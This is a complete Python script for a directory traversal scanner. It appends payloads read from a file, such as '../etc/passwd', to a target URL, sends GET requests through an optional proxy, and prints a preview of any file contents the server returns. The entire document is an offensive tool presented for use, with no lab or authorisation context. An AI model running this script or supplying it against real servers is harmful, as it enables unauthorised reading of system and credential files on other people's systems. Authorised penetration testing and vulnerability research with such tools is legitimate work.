import requests
import argparse
from art import text2art

# Generate ASCII art using "3d" font   
ascii_art = text2art("tool", font="3d")

# Print the ASCII art
print(ascii_art)

def try_directory_traversal(url, payload, proxies=None):
    """Try to perform a directory traversal attack by injecting payloads."""
    # Construct the URL to inject the directory traversal payload
    vulnerable_url = url + payload
    try:
        # Send GET request to the URL with the optional proxy
        response = requests.get(vulnerable_url, proxies=proxies)

        # Check for a successful response (status code 200)
        if response.status_code == 200:
            print(f"[+] Potential Directory Traversal vulnerability found: {vulnerable_url}")
            print(f"Response body preview:\n{response.text[:500]}...")  # Print the first 500 characters
        else:
            print(f"[-] Failed to retrieve file from {vulnerable_url} (status code {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while processing {vulnerable_url}: {e}")

def process_file(file_path, url, proxies=None):
    """Process each payload from the file and attempt directory traversal."""
    try:
        # Open and read the file containing potential directory traversal payloads
        with open(file_path, 'r') as file:
            payloads = file.readlines()

        # Iterate over each payload and attempt directory traversal
        for payload in payloads:
            payload = payload.strip()  # Remove leading/trailing whitespaces or newlines
            if payload:  # Skip empty lines
                print(f"Attempting directory traversal with payload: {payload}")
                try_directory_traversal(url, payload, proxies)

    except Exception as e:
        print(f"An error occurred while reading the file: {e}")

# Main code for CLI input and proxy options
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Directory Traversal Scanner - Attempt to find directory traversal vulnerabilities.")

    # Add URL argument
    parser.add_argument("url", help="The vulnerable URL to test (e.g., http://example.com/file.php?file=)")

    # Add file argument containing payloads for directory traversal
    parser.add_argument("file", help="Path to the file containing directory traversal payloads (e.g., ../etc/passwd).")

    # Add proxy argument (optional)
    parser.add_argument("--proxy", help="Proxy IP and Port (e.g., http://127.0.0.1:8080)", type=str, default=None)

    # Parse the command-line arguments
    args = parser.parse_args()

    # Set up the proxies dictionary if provided
    proxies = None
    if args.proxy:
        # Assuming the proxy format is http://ip:port
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }

    # Call the function to process the file and check for directory traversal
    process_file(args.file, args.url, proxies)
